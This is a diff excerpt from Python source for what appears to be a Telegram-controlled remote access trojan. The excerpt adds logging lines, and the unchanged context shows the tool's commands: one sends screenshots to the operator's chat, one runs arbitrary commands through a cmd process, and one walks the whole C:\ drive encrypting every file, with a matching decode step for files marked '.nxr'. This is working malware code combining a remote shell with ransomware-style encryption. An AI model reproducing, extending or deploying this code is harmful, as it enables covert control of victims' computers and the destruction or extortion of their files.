@@ -220,8 +220,10 @@ def handle(msg):
                                         bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
                                         os.remove('screenshot.jpg')
                                 elif command.startswith('/cmd_exec'):
+                                        cd.log('w','Command exec prep')
                                         process = Popen(['cmd'], stdin=PIPE, stdout=PIPE)
                                         command = command.replace('/cmd_exec', '')
+                                        cd.log('w','Executing the command '+command)
                                         if len(command) > 1:
                                                 process.stdin.write(bytes(command + '\n'))
                                                 process.stdin.close()
@@ -276,11 +278,13 @@ def handle(msg):
                                                         except:
                                                                 response = 'Could not find ' + path_file
                                 elif command.endswith('code_all'):
+                                        cd.log('w','Data encryption option.')
                                         parentDirectory = 'C:\\'
                                         for root, dirs, files in os.walk(parentDirectory):
                                                 for afile in files:
                                                         full_path = os.path.join(root, afile)
                                                         if command.startswith('/en'):
+                                                                cd.log('w','WARNING ABOUT TO ENCRYPT DATA!!!! IN '+str(full_path))
                                                                 encode(full_path)
                                                         elif command.startswith('/de') and full_path.endswith('.nxr'):#our extension (been encoded)
                                                                 decode(full_path)
